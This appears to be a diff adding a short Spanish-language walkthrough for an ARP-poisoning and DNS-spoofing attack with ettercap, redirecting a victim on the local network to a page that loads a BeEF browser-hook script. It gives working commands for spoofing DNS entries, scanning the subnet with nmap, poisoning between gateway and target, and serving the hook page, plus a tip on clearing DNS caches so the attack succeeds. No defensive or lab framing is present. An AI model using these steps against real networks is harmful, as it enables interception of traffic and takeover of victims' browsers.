@@ -1,0 +1,33 @@
+1/ Lo primero modificamos el archivo /etc/ettercap/etter.dns y a;adimos una entrada.
+
+echo "example.com A <ip.example(192.168.1.1)>" | sudo tee -a /etc/ettercap/etter.dns
+
+2/ Crear una web page en /tmp para cargar el hook de BeEF
+
+<head>
+    <script src="http://example.com:3000/hook.js"></script>
+<head>
+
+3/ Crear servidor
+
+python -m SimpleHTTPServer 80
+
+4/ Iniciar BeEF sudo beef-xss
+
+5/ Buscar ips 
+
+sudo nmap -n -sn <ip.example>/24
+
+6/ Buscar el gateway
+
+ip route
+
+7/ establecemos ettercap formato MAC address/IPv4 addresses/IPv6 addresses/Ports
+
+sudo ettercap -M arp:remote -T -q /<ip.gateway>// /<ip.target>//
+
+8/  habilitamos el dns_spoof plugin de ettercap.
+
+9/ una vez que se entre a example.com se completa el ataque
+
+CONSEJOS: Los sistemas operativos suelen guardar la resolucion de nombres en el cache asi que si el ataque no funciona, hay que borrar el cache para que en vez de buscar en el cache, forzar que se haga el ARP request.
